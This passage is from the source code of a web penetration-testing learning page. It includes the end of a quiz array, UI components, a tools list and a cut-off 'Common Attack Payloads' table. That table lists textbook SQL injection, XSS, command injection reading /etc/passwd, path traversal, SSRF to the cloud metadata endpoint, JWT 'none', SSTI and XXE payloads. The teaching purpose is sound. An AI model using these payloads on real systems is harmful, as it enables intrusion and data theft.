    options: ["CSRF", "SQL injection", "XSS", "Brute force"],
    correctAnswer: 0,
    explanation: "State binds the OAuth flow to the user session.",
  },
  {
    id: 32,
    topic: "OAuth",
    question: "Open redirect issues can lead to:",
    options: ["Token leakage and phishing", "Stronger encryption", "Improved caching", "Better UX"],
    correctAnswer: 0,
    explanation: "Redirect flaws can steal tokens or trick users.",
  },
  {
    id: 33,
    topic: "Authorization",
    question: "BOLA is commonly associated with:",
    options: ["APIs with object-level authorization", "TLS misconfiguration", "Client-side validation", "Log rotation"],
    correctAnswer: 0,
    explanation: "BOLA refers to broken object-level authorization in APIs.",
  },
  {
    id: 34,
    topic: "GraphQL",
    question: "A key risk with GraphQL is:",
    options: ["Missing auth checks on nested fields", "Too many cookies", "TLS downgrade", "DNS rebinding"],
    correctAnswer: 0,
    explanation: "GraphQL needs field-level authorization.",
  },
  {
    id: 35,
    topic: "WebSockets",
    question: "WebSocket security should include:",
    options: ["Auth checks during upgrade and reconnect", "Disabling TLS", "Using only HTTP", "Removing origin checks"],
    correctAnswer: 0,
    explanation: "Authentication must be enforced for persistent connections.",
  },
  {
    id: 36,
    topic: "TLS",
    question: "A modern TLS version to enforce is:",
    options: ["TLS 1.3", "SSL 2.0", "SSL 3.0", "TLS 1.0"],
    correctAnswer: 0,
    explanation: "TLS 1.3 is the current best practice.",
  },
  {
    id: 37,
    topic: "Headers",
    question: "HSTS ensures:",
    options: ["Browsers use HTTPS only", "Cookies are encrypted", "SQLi is blocked", "Sessions never expire"],
    correctAnswer: 0,
    explanation: "HSTS forces HTTPS for a domain.",
  },
  {
    id: 38,
    topic: "Headers",
    question: "Which header helps prevent clickjacking?",
    options: ["X-Frame-Options", "X-Powered-By", "ETag", "Last-Modified"],
    correctAnswer: 0,
    explanation: "X-Frame-Options restricts framing.",
  },
  {
    id: 39,
    topic: "Exploitation",
    question: "A safe RCE proof-of-concept is:",
    options: ["whoami or hostname", "rm -rf /", "exfiltrate user data", "install backdoors"],
    correctAnswer: 0,
    explanation: "Use harmless commands to prove execution.",
  },
  {
    id: 40,
    topic: "Authorization",
    question: "Mass assignment vulnerabilities allow:",
    options: ["Setting unintended fields via APIs", "SQL injection", "XSS", "SSRF"],
    correctAnswer: 0,
    explanation: "Mass assignment lets clients set sensitive fields.",
  },
  {
    id: 41,
    topic: "Rate Limiting",
    question: "A common rate-limit bypass technique is:",
    options: ["IP rotation and header manipulation", "Using HTTPS", "Clearing cookies", "Changing tabs"],
    correctAnswer: 0,
    explanation: "Attackers rotate IPs or spoof headers to evade limits.",
  },
  {
    id: 42,
    topic: "Client-Side",
    question: "Exposed API keys in client code are risky because:",
    options: ["Anyone can reuse them", "They enable faster downloads", "They reduce logging", "They enforce MFA"],
    correctAnswer: 0,
    explanation: "Client-side keys can be harvested and abused.",
  },
  {
    id: 43,
    topic: "Cloud",
    question: "A common cloud storage issue is:",
    options: ["Public buckets with sensitive data", "Too much encryption", "Short filenames", "Using HTTPS"],
    correctAnswer: 0,
    explanation: "Misconfigured buckets often expose data publicly.",
  },
  {
    id: 44,
    topic: "Recon",
    question: "JavaScript analysis is useful for:",
    options: ["Finding hidden endpoints and secrets", "Increasing TLS strength", "Fixing DNS", "Generating CSRF tokens"],
    correctAnswer: 0,
    explanation: "Client bundles often reveal API routes or keys.",
  },
  {
    id: 45,
    topic: "HTTP",
    question: "Parameter pollution occurs when:",
    options: ["Multiple parameters with same name change behavior", "Passwords are reused", "Headers are missing", "TLS is weak"],
    correctAnswer: 0,
    explanation: "Duplicate params can confuse backend parsing.",
  },
  {
    id: 46,
    topic: "HTTP",
    question: "Host header attacks can be used to:",
    options: ["Poison password reset links", "Fix cookies", "Prevent XSS", "Improve caching"],
    correctAnswer: 0,
    explanation: "Host header tampering can alter generated links.",
  },
  {
    id: 47,
    topic: "CORS",
    question: "A risky CORS configuration is:",
    options: ["Reflecting any Origin with credentials", "Restricting to a single origin", "Using preflight", "Disabling credentials"],
    correctAnswer: 0,
    explanation: "Reflecting origin and allowing credentials enables cross-site access.",
  },
  {
    id: 48,
    topic: "Testing",
    question: "Timing or size differences can indicate:",
    options: ["User enumeration or blind injection", "Stronger encryption", "Reduced attack surface", "No vulnerability"],
    correctAnswer: 0,
    explanation: "Differences often reveal true/false conditions.",
  },
  {
    id: 49,
    topic: "HTTP",
    question: "HTTP request smuggling relies on:",
    options: ["Discrepancies in request parsing", "Weak passwords", "Expired cookies", "Exposed logs"],
    correctAnswer: 0,
    explanation: "CL/TE mismatches can desync proxies and servers.",
  },
  {
    id: 50,
    topic: "HTTP",
    question: "A likely impact of request smuggling is:",
    options: ["Cache poisoning or auth bypass", "Better TLS", "Faster responses", "Lower CPU"],
    correctAnswer: 0,
    explanation: "Smuggling can poison caches or bypass controls.",
  },
  {
    id: 51,
    topic: "Authorization",
    question: "Broken access control can lead to:",
    options: ["Unauthorized data access", "Improved uptime", "Fewer errors", "Smaller logs"],
    correctAnswer: 0,
    explanation: "Access control failures expose sensitive data and functions.",
  },
  {
    id: 52,
    topic: "Credentials",
    question: "Default credentials are dangerous because:",
    options: ["They are widely known and reused", "They are too long", "They require MFA", "They are encrypted"],
    correctAnswer: 0,
    explanation: "Default passwords are commonly guessed.",
  },
  {
    id: 53,
    topic: "Recon",
    question: "Which tool is commonly used for directory brute forcing?",
    options: ["ffuf", "tcpdump", "john", "aircrack-ng"],
    correctAnswer: 0,
    explanation: "ffuf is a popular directory and content discovery tool.",
  },
  {
    id: 54,
    topic: "Recon",
    question: "Which tools are used for subdomain enumeration?",
    options: ["Amass or Subfinder", "Hashcat", "Wireshark", "Netcat"],
    correctAnswer: 0,
    explanation: "Amass and Subfinder enumerate subdomains.",
  },
  {
    id: 55,
    topic: "MFA",
    question: "MFA fatigue attacks target:",
    options: ["Push notification prompts", "Password hashes", "TLS ciphers", "DNS records"],
    correctAnswer: 0,
    explanation: "Fatigue attacks spam push approvals.",
  },
  {
    id: 56,
    topic: "Tokens",
    question: "Tokens in URLs are risky due to:",
    options: ["Referer logs and browser history leakage", "Lower entropy", "Better caching", "Automatic rotation"],
    correctAnswer: 0,
    explanation: "URLs leak via logs and referrers.",
  },
  {
    id: 57,
    topic: "Sessions",
    question: "Good session management includes:",
    options: ["Idle and absolute timeouts", "No expiration", "Same session after logout", "URL tokens"],
    correctAnswer: 0,
    explanation: "Sessions should expire and be invalidated properly.",
  },
  {
    id: 58,
    topic: "APIs",
    question: "Rate limiting should ideally be enforced:",
    options: ["Per user or token, not just IP", "Only for admins", "Only for GET requests", "Only in the client"],
    correctAnswer: 0,
    explanation: "Per-user limits prevent abuse across shared IPs.",
  },
  {
    id: 59,
    topic: "Authorization",
    question: "A common IDOR test is to:",
    options: ["Change an object ID in the request", "Change the User-Agent", "Clear cookies", "Switch HTTPS to HTTP"],
    correctAnswer: 0,
    explanation: "Swapping IDs reveals missing access checks.",
  },
  {
    id: 60,
    topic: "Client-Side",
    question: "Storing JWTs in localStorage increases risk of:",
    options: ["XSS token theft", "SQL injection", "CSRF", "SSRF"],
    correctAnswer: 0,
    explanation: "XSS can read localStorage tokens.",
  },
  {
    id: 61,
    topic: "WAF",
    question: "Common WAF bypass techniques include:",
    options: ["Encoding and case variations", "Using HTTPS", "Shorter URLs", "Static content"],
    correctAnswer: 0,
    explanation: "WAFs can be bypassed with encoding and obfuscation.",
  },
  {
    id: 62,
    topic: "SSRF",
    question: "The AWS metadata IP is:",
    options: ["169.254.169.254", "127.0.0.1", "10.0.0.1", "8.8.8.8"],
    correctAnswer: 0,
    explanation: "Cloud metadata endpoints are commonly at 169.254.169.254.",
  },
  {
    id: 63,
    topic: "SQL Injection",
    question: "The best defense against SQL injection is:",
    options: ["Parameterized queries", "Client-side validation", "String concatenation", "Hiding errors"],
    correctAnswer: 0,
    explanation: "Prepared statements prevent injection.",
  },
  {
    id: 64,
    topic: "XSS",
    question: "The primary defense against XSS is:",
    options: ["Context-aware output encoding", "Disabling JavaScript", "Using GET only", "Blocking images"],
    correctAnswer: 0,
    explanation: "Output encoding neutralizes injected scripts.",
  },
  {
    id: 65,
    topic: "CSRF",
    question: "CSRF risk is higher when:",
    options: ["Apps rely on cookies without CSRF tokens", "Apps use tokens in headers", "Apps are read-only", "Apps use OAuth"],
    correctAnswer: 0,
    explanation: "Cookie-based auth needs CSRF protections.",
  },
  {
    id: 66,
    topic: "Business Logic",
    question: "A business logic flaw example is:",
    options: ["Manipulating price or quantity fields", "TLS downgrade", "SQLi", "Buffer overflow"],
    correctAnswer: 0,
    explanation: "Logic bugs often involve workflow or pricing abuse.",
  },
  {
    id: 67,
    topic: "JWT",
    question: "JWT validation should always check:",
    options: ["Signature and expiration", "Only the header", "Only the payload", "Only the issuer name"],
    correctAnswer: 0,
    explanation: "Signature and exp are critical for JWT security.",
  },
  {
    id: 68,
    topic: "Sessions",
    question: "Session IDs should be:",
    options: ["Random and high entropy", "Sequential", "Usernames", "Timestamps"],
    correctAnswer: 0,
    explanation: "High-entropy IDs resist guessing.",
  },
  {
    id: 69,
    topic: "Scope",
    question: "Pentesting should only be performed on:",
    options: ["Authorized, in-scope targets", "Any public IP", "Competitor sites", "Unpatched systems"],
    correctAnswer: 0,
    explanation: "Testing must follow scope and authorization.",
  },
  {
    id: 70,
    topic: "Reporting",
    question: "A good report should include:",
    options: ["Impact, steps to reproduce, and remediation", "Only raw logs", "Only CVSS scores", "Only screenshots"],
    correctAnswer: 0,
    explanation: "Clear impact and remediation make reports actionable.",
  },
  {
    id: 71,
    topic: "Headers",
    question: "Which header helps control allowed framing sources in CSP?",
    options: ["frame-ancestors", "script-src", "img-src", "connect-src"],
    correctAnswer: 0,
    explanation: "frame-ancestors governs which sites can frame content.",
  },
  {
    id: 72,
    topic: "OAuth",
    question: "PKCE primarily protects against:",
    options: ["Authorization code interception", "SQL injection", "XSS", "DNS poisoning"],
    correctAnswer: 0,
    explanation: "PKCE prevents stolen auth codes from being used.",
  },
  {
    id: 73,
    topic: "CORS",
    question: "A secure CORS setup should:",
    options: ["Allow only trusted origins", "Allow all origins with credentials", "Disable preflight", "Ignore Origin header"],
    correctAnswer: 0,
    explanation: "Restricting origins reduces cross-site risk.",
  },
  {
    id: 74,
    topic: "Testing",
    question: "Why is staging often risky?",
    options: ["It may have weaker auth or debug endpoints", "It always uses TLS 1.3", "It blocks all traffic", "It mirrors production security"],
    correctAnswer: 0,
    explanation: "Staging is frequently less hardened than production.",
  },
  {
    id: 75,
    topic: "Reporting",
    question: "An executive summary should focus on:",
    options: ["Business impact and risk", "Payload syntax", "Raw HTTP requests", "Stack traces"],
    correctAnswer: 0,
    explanation: "Executives need risk and impact, not technical details.",
  },
];


function TopicAccordion({ topics, defaultExpanded = false }: { topics: TopicSection[]; defaultExpanded?: boolean }) {
  const theme = useTheme();

  return (
    <>
      {topics.map((topic, index) => (
        <Accordion
          key={topic.title}
          defaultExpanded={defaultExpanded && index === 0}
          sx={{
            mb: 2,
            border: `1px solid ${alpha(topic.color, 0.2)}`,
            borderRadius: "12px !important",
            "&:before": { display: "none" },
            overflow: "hidden",
          }}
        >
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            sx={{
              borderLeft: `4px solid ${topic.color}`,
              "&:hover": { bgcolor: alpha(topic.color, 0.02) },
            }}
          >
            <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
              <Box
                sx={{
                  width: 40,
                  height: 40,
                  borderRadius: 2,
                  bgcolor: alpha(topic.color, 0.1),
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: topic.color,
                }}
              >
                {topic.icon}
              </Box>
              <Box>
                <Typography variant="h6" sx={{ fontWeight: 700 }}>
                  {topic.title}
                </Typography>
                <Typography variant="body2" color="text.secondary" sx={{ display: { xs: "none", sm: "block" } }}>
                  {topic.description}
                </Typography>
              </Box>
            </Box>
          </AccordionSummary>
          <AccordionDetails sx={{ pt: 0 }}>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3, display: { xs: "block", sm: "none" } }}>
              {topic.description}
            </Typography>

            {/* Detailed Description - Beginner-Friendly Content */}
            {topic.detailedDescription && (
              <Box sx={{ mb: 3 }}>
                <Paper
                  sx={{
                    p: 3,
                    bgcolor: alpha(topic.color, 0.02),
                    border: `1px solid ${alpha(topic.color, 0.1)}`,
                    borderRadius: 2,
                  }}
                >
                  <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: topic.color, display: "flex", alignItems: "center", gap: 1 }}>
                     In-Depth Explanation
                  </Typography>
                  {topic.detailedDescription.split("\n\n").map((paragraph, i) => (
                    <Typography
                      key={i}
                      variant="body2"
                      sx={{
                        mb: i < topic.detailedDescription!.split("\n\n").length - 1 ? 2 : 0,
                        lineHeight: 1.8,
                        whiteSpace: "pre-wrap",
                      }}
                    >
                      {paragraph}
                    </Typography>
                  ))}
                </Paper>
              </Box>
            )}

            {/* Real World Example */}
            {topic.realWorldExample && (
              <Box sx={{ mb: 3 }}>
                <Alert
                  severity="info"
                  icon={<AssignmentIcon />}
                  sx={{
                    borderRadius: 2,
                    bgcolor: alpha(theme.palette.info.main, 0.05),
                    border: `1px solid ${alpha(theme.palette.info.main, 0.15)}`,
                    "& .MuiAlert-message": { width: "100%" },
                  }}
                >
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "info.main" }}>
                     Real-World Case Study
                  </Typography>
                  <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                    {topic.realWorldExample}
                  </Typography>
                </Alert>
              </Box>
            )}

            {/* Beginner Tips */}
            {topic.beginnerTips && topic.beginnerTips.length > 0 && (
              <Box sx={{ mb: 3 }}>
                <Alert
                  severity="success"
                  icon={<SchoolIcon />}
                  sx={{
                    borderRadius: 2,
                    bgcolor: alpha(theme.palette.success.main, 0.05),
                    border: `1px solid ${alpha(theme.palette.success.main, 0.15)}`,
                    "& .MuiAlert-message": { width: "100%" },
                  }}
                >
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "success.main" }}>
                     Beginner Tips
                  </Typography>
                  <List dense disablePadding>
                    {topic.beginnerTips.map((tip, i) => (
                      <ListItem key={i} disableGutters sx={{ py: 0.25 }}>
                        <Typography variant="body2"> {tip}</Typography>
                      </ListItem>
                    ))}
                  </List>
                </Alert>
              </Box>
            )}

            {/* Common Mistakes */}
            {topic.commonMistakes && topic.commonMistakes.length > 0 && (
              <Box sx={{ mb: 3 }}>
                <Alert
                  severity="warning"
                  icon={<WarningIcon />}
                  sx={{
                    borderRadius: 2,
                    bgcolor: alpha(theme.palette.warning.main, 0.05),
                    border: `1px solid ${alpha(theme.palette.warning.main, 0.15)}`,
                    "& .MuiAlert-message": { width: "100%" },
                  }}
                >
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "warning.main" }}>
                     Common Mistakes to Avoid
                  </Typography>
                  <List dense disablePadding>
                    {topic.commonMistakes.map((mistake, i) => (
                      <ListItem key={i} disableGutters sx={{ py: 0.25 }}>
                        <Typography variant="body2"> {mistake}</Typography>
                      </ListItem>
                    ))}
                  </List>
                </Alert>
              </Box>
            )}

            <Grid container spacing={3}>
              {/* Key Points */}
              <Grid item xs={12} md={topic.techniques || topic.tools ? 6 : 12}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2, color: topic.color }}>
                   Key Points
                </Typography>
                <List dense disablePadding>
                  {topic.keyPoints.map((point, i) => (
                    <ListItem key={i} disableGutters sx={{ py: 0.5 }}>
                      <ListItemIcon sx={{ minWidth: 28 }}>
                        <CheckCircleIcon sx={{ fontSize: 16, color: topic.color }} />
                      </ListItemIcon>
                      <ListItemText
                        primary={point}
                        primaryTypographyProps={{ variant: "body2" }}
                      />
                    </ListItem>
                  ))}
                </List>
              </Grid>

              {/* Techniques and Tools */}
              {(topic.techniques || topic.tools) && (
                <Grid item xs={12} md={6}>
                  {topic.techniques && (
                    <Box sx={{ mb: 3 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2, color: "warning.main" }}>
                         Techniques
                      </Typography>
                      <Paper
                        sx={{
                          p: 2,
                          bgcolor: alpha(theme.palette.warning.main, 0.03),
                          border: `1px solid ${alpha(theme.palette.warning.main, 0.15)}`,
                          borderRadius: 2,
                        }}
                      >
                        {topic.techniques.map((technique, i) => (
                          <Typography
                            key={i}
                            variant="body2"
                            sx={{
                              fontFamily: "monospace",
                              fontSize: "0.8rem",
                              mb: i < topic.techniques!.length - 1 ? 1 : 0,
                            }}
                          >
                             {technique}
                          </Typography>
                        ))}
                      </Paper>
                    </Box>
                  )}

                  {topic.tools && (
                    <Box sx={{ mb: 2 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1.5 }}>
                         Tools
                      </Typography>
                      <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                        {topic.tools.map((tool) => (
                          <Chip
                            key={tool}
                            label={tool}
                            size="small"
                            sx={{
                              bgcolor: alpha(topic.color, 0.1),
                              color: topic.color,
                              fontWeight: 500,
                            }}
                          />
                        ))}
                      </Box>
                    </Box>
                  )}

                  {topic.cwe && (
                    <Box>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                         Related CWEs
                      </Typography>
                      {topic.cwe.map((cwe) => (
                        <Chip
                          key={cwe}
                          label={cwe}
                          size="small"
                          variant="outlined"
                          sx={{ mr: 0.5, mb: 0.5, fontSize: "0.7rem" }}
                        />
                      ))}
                    </Box>
                  )}
                </Grid>
              )}

              {/* Tips */}
              {topic.tips && (
                <Grid item xs={12}>
                  <Alert
                    severity="info"
                    icon={<InfoIcon />}
                    sx={{
                      borderRadius: 2,
                      "& .MuiAlert-message": { width: "100%" },
                    }}
                  >
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                       Pro Tips
                    </Typography>
                    <List dense disablePadding>
                      {topic.tips.map((tip, i) => (
                        <ListItem key={i} disableGutters sx={{ py: 0.25 }}>
                          <Typography variant="body2"> {tip}</Typography>
                        </ListItem>
                      ))}
                    </List>
                  </Alert>
                </Grid>
              )}
            </Grid>
          </AccordionDetails>
        </Accordion>
      ))}
    </>
  );
}

export default function PentestGuidePage() {
  const theme = useTheme();
  const navigate = useNavigate();
  const isMobile = useMediaQuery(theme.breakpoints.down("md"));
  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
  const [activeSection, setActiveSection] = useState("intro");
  const [quizPool] = useState<QuizQuestion[]>(() =>
    selectRandomQuestions(quizQuestions, QUIZ_QUESTION_COUNT)
  );

  const scrollToSection = (id: string) => {
    const el = document.getElementById(id);
    if (el) {
      el.scrollIntoView({ behavior: "smooth", block: "start" });
      setActiveSection(id);
      setNavDrawerOpen(false);
    }
  };

  useEffect(() => {
    const handleScroll = () => {
      const sections = sectionNavItems.map((s) => s.id);
      for (const id of sections) {
        const el = document.getElementById(id);
        if (el) {
          const rect = el.getBoundingClientRect();
          if (rect.top <= 150 && rect.bottom > 150) {
            setActiveSection(id);
            break;
          }
        }
      }
    };
    window.addEventListener("scroll", handleScroll, { passive: true });
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const pageContext = `This page covers penetration testing methodology and techniques. Topics include: reconnaissance, scanning, enumeration, exploitation, post-exploitation, and reporting. Current section: ${activeSection}. Covers OWASP testing methodology, common attack vectors, and professional pentest workflows.`;

  // Sidebar navigation component
  const sidebarNav = (
    <Paper
      sx={{
        p: 2,
        position: "sticky",
        top: 80,
        maxHeight: "calc(100vh - 100px)",
        overflowY: "auto",
        bgcolor: "#12121a",
        border: `1px solid ${alpha(ACCENT_COLOR, 0.2)}`,
        borderRadius: 2,
      }}
    >
      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: ACCENT_COLOR, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
        <ListAltIcon fontSize="small" />
        Contents
      </Typography>
      <Box sx={{ mb: 2 }}>
        <LinearProgress
          variant="determinate"
          value={((sectionNavItems.findIndex((s) => s.id === activeSection) + 1) / sectionNavItems.length) * 100}
          sx={{
            height: 4,
            borderRadius: 2,
            bgcolor: alpha(ACCENT_COLOR, 0.1),
            "& .MuiLinearProgress-bar": { bgcolor: ACCENT_COLOR },
          }}
        />
        <Typography variant="caption" sx={{ color: "grey.500", mt: 0.5, display: "block" }}>
          {sectionNavItems.findIndex((s) => s.id === activeSection) + 1} / {sectionNavItems.length} sections
        </Typography>
      </Box>
      <List dense disablePadding>
        {sectionNavItems.map((item) => (
          <ListItem
            key={item.id}
            component="button"
            onClick={() => scrollToSection(item.id)}
            sx={{
              borderRadius: 1,
              mb: 0.5,
              bgcolor: activeSection === item.id ? alpha(ACCENT_COLOR, 0.15) : "transparent",
              borderLeft: activeSection === item.id ? `3px solid ${ACCENT_COLOR}` : "3px solid transparent",
              cursor: "pointer",
              border: "none",
              width: "100%",
              textAlign: "left",
              "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.08) },
            }}
          >
            <ListItemIcon sx={{ minWidth: 32, color: activeSection === item.id ? ACCENT_COLOR : "grey.500" }}>
              {item.icon}
            </ListItemIcon>
            <ListItemText
              primary={item.label}
              primaryTypographyProps={{
                variant: "body2",
                fontWeight: activeSection === item.id ? 600 : 400,
                color: activeSection === item.id ? "#e0e0e0" : "grey.400",
              }}
            />
          </ListItem>
        ))}
      </List>
    </Paper>
  );

  return (
    <LearnPageLayout pageTitle="Penetration Testing Guide" pageContext={pageContext}>
    <Box sx={{ minHeight: "100vh", bgcolor: "#0a0a0f", py: 4 }}>
      <Container maxWidth="xl">
        <Grid container spacing={3}>
          {/* Sidebar Navigation - Desktop */}
          {!isMobile && (
            <Grid item md={2.5} sx={{ display: { xs: "none", md: "block" } }}>
              {sidebarNav}
            </Grid>
          )}

          {/* Main Content */}
          <Grid item xs={12} md={9.5}>
        {/* Header */}
        <Box id="intro" sx={{ mb: 4 }}>
          <Chip
            component={Link}
            to="/learn"
            icon={<ArrowBackIcon />}
            label="Back to Learning Hub"
            clickable
            variant="outlined"
            sx={{ borderRadius: 2, mb: 3 }}
          />
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
            <SecurityIcon sx={{ fontSize: 40, color: "#ef4444" }} />
            <Typography
              variant="h3"
              sx={{
                fontWeight: 700,
                background: "linear-gradient(135deg, #ef4444 0%, #f59e0b 100%)",
                backgroundClip: "text",
                WebkitBackgroundClip: "text",
                color: "transparent",
              }}
            >
              Web App Pentesting Guide
            </Typography>
          </Box>
          <Typography variant="h6" sx={{ color: "grey.400", mb: 2 }}>
            Comprehensive methodology for professional security assessments
          </Typography>
          <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
            <Chip icon={<BugReportIcon />} label="OWASP Top 10" size="small" />
            <Chip icon={<SearchIcon />} label="Reconnaissance" size="small" />
            <Chip icon={<LockIcon />} label="Authentication" size="small" />
            <Chip icon={<CodeIcon />} label="Injection Attacks" size="small" />
          </Box>
        </Box>

        {/* Introduction Section */}
        <Paper
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            background: `linear-gradient(135deg, ${alpha("#ef4444", 0.15)} 0%, ${alpha("#f59e0b", 0.1)} 50%, ${alpha("#ef4444", 0.05)} 100%)`,
            border: `1px solid ${alpha("#ef4444", 0.3)}`,
          }}
        >
          <Typography variant="h5" gutterBottom sx={{ fontWeight: 700, color: "#e0e0e0" }}>
            What is Web Application Penetration Testing?
          </Typography>

          <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, color: "grey.300" }}>
            <strong>Web Application Penetration Testing</strong> (or "web pentesting") is the practice of simulating real-world
            attacks against web applications to identify security vulnerabilities before malicious actors can exploit them.
            It's a critical component of any organization's security program.
          </Typography>

          <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, color: "grey.300" }}>
            Unlike automated vulnerability scanning, penetration testing involves <em>manual verification</em>, business logic
            testing, and chaining multiple vulnerabilities together - just like a real attacker would.
          </Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {[
              { icon: <BugReportIcon />, title: "Find Vulnerabilities", desc: "Identify security flaws before attackers do", color: "#ef4444" },
              { icon: <PolicyIcon />, title: "Compliance", desc: "Meet PCI-DSS, SOC2, and regulatory requirements", color: "#f59e0b" },
              { icon: <SecurityIcon />, title: "Risk Assessment", desc: "Understand real-world impact of security issues", color: "#22c55e" },
              { icon: <FactCheckIcon />, title: "Validate Controls", desc: "Test effectiveness of security measures", color: "#06b6d4" },
            ].map((item) => (
              <Grid item xs={12} sm={6} md={3} key={item.title}>
                <Card
                  sx={{
                    height: "100%",
                    bgcolor: alpha(item.color, 0.1),
                    border: `1px solid ${alpha(item.color, 0.3)}`,
                    borderRadius: 2,
                  }}
                >
                  <CardContent>
                    <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1, color: item.color }}>
                      {item.icon}
                      <Typography variant="subtitle2" fontWeight="bold" sx={{ color: "#e0e0e0" }}>{item.title}</Typography>
                    </Box>
                    <Typography variant="body2" sx={{ color: "grey.400" }}>{item.desc}</Typography>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>

          <Alert severity="warning" sx={{ bgcolor: alpha("#f59e0b", 0.1), border: `1px solid ${alpha("#f59e0b", 0.3)}` }}>
            <Typography sx={{ color: "#e0e0e0", fontWeight: 600 }}>Legal Disclaimer</Typography>
            <Typography sx={{ color: "grey.300" }}>
              This guide is for authorized security testing only. Always obtain written permission before testing.
              Unauthorized access to computer systems is illegal. Use this knowledge responsibly and ethically.
            </Typography>
          </Alert>
        </Paper>

        {/* Essential Pentesting Tools */}
        <Paper
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: "#0f1024",
            border: `1px solid ${alpha("#8b5cf6", 0.3)}`,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <BuildIcon sx={{ color: "#8b5cf6" }} />
            Essential Pentesting Tools
          </Typography>

          <Grid container spacing={2}>
            {[
              {
                category: "Proxy & Interception",
                color: "#ef4444",
                tools: [
                  { name: "Burp Suite", desc: "Industry-standard web proxy with scanner, intruder, repeater" },
                  { name: "OWASP ZAP", desc: "Free open-source alternative with active scanning" },
                  { name: "mitmproxy", desc: "CLI-based proxy for scripting and automation" },
                ],
              },
              {
                category: "Reconnaissance",
                color: "#f59e0b",
                tools: [
                  { name: "Nmap", desc: "Network scanning and service enumeration" },
                  { name: "Amass / Subfinder", desc: "Subdomain enumeration and OSINT" },
                  { name: "ffuf / Gobuster", desc: "Directory and parameter fuzzing" },
                ],
              },
              {
                category: "Exploitation",
                color: "#22c55e",
                tools: [
                  { name: "SQLMap", desc: "Automated SQL injection detection and exploitation" },
                  { name: "Nuclei", desc: "Template-based vulnerability scanning" },
                  { name: "XSStrike", desc: "Advanced XSS detection and exploitation" },
                ],
              },
              {
                category: "Post-Exploitation",
                color: "#06b6d4",
                tools: [
                  { name: "Metasploit", desc: "Exploitation framework with payloads and post modules" },
                  { name: "Cobalt Strike", desc: "Commercial adversary simulation platform" },
                  { name: "Impacket", desc: "Python network protocol tools for Windows" },
                ],
              },
            ].map((cat) => (
              <Grid item xs={12} sm={6} md={3} key={cat.category}>
                <Card sx={{ height: "100%", bgcolor: alpha(cat.color, 0.08), border: `1px solid ${alpha(cat.color, 0.2)}`, borderRadius: 2 }}>
                  <CardContent>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: cat.color, mb: 2 }}>
                      {cat.category}
                    </Typography>
                    {cat.tools.map((tool) => (
                      <Box key={tool.name} sx={{ mb: 1.5 }}>
                        <Typography variant="subtitle2" sx={{ fontWeight: 600, color: "#e0e0e0" }}>
                          {tool.name}
                        </Typography>
                        <Typography variant="caption" sx={{ color: "grey.400" }}>
                          {tool.desc}
                        </Typography>
                      </Box>
                    ))}
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>
        </Paper>

        {/* Quick Reference: Common Payloads */}
        <Paper
          sx={{
            p: 4,
            mb: 4,
            borderRadius: 3,
            bgcolor: "#0f1024",
            border: `1px solid ${alpha("#ef4444", 0.3)}`,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <SpeedIcon sx={{ color: "#ef4444" }} />
            Quick Reference: Common Attack Payloads
          </Typography>

          <Grid container spacing={2}>
            {[
              { attack: "SQL Injection", payload: "' OR '1'='1' --", target: "Login forms, search, APIs", severity: "Critical", color: "#ef4444" },
              { attack: "XSS (Reflected)", payload: "<script>alert(document.domain)</script>", target: "URL parameters, search boxes", severity: "High", color: "#f59e0b" },
              { attack: "XSS (Stored)", payload: "<img src=x onerror=alert(1)>", target: "Comments, profiles, messages", severity: "High", color: "#f59e0b" },
              { attack: "Command Injection", payload: "; cat /etc/passwd", target: "File operations, ping utilities", severity: "Critical", color: "#ef4444" },
              { attack: "Path Traversal", payload: "../../etc/passwd", target: "File download, include functions", severity: "High", color: "#f59e0b" },
              { attack: "SSRF", payload: "http://169.254.169.254/latest/meta-data/", target: "URL fetchers, webhooks", severity: "High", color: "#f59e0b" },
              { attack: "IDOR", payload: "/api/users/123  /api/users/124", target: "User profiles, orders, files", severity: "Medium", color: "#3b82f6" },
              { attack: "JWT None Alg", payload: '{"alg":"none","typ":"JWT"}', target: "JWT authentication", severity: "Critical", color: "#ef4444" },
              { attack: "SSTI (Jinja2)", payload: "{{7*7}}  {{config}}", target: "Template engines", severity: "Critical", color: "#ef4444" },
              { attack: "XXE", payload: '<!ENTITY xxe SYSTEM "file:///etc/passwd">', target: "XML parsers", severity: "High", color: "#f59e0b" },
